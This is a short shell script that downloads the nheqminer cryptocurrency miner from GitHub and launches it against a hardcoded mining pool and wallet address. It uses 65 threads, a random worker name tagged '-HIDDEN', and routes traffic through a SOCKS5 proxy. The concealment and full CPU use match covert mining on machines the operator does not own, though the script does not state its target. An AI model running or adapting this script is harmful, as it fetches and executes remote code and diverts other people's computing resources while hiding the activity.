#!/bin/sh
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz 
tar -xvf nheqminer-Linux-v0.8.2.tar.gz

nheqminer/nheqminer -v -l 139.99.123.225:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.$(echo $(shuf -i 1-2000 -n 1)-HIDDEN) -p -t 65 -x socks5://1234:1234@209.97.167.69:3838
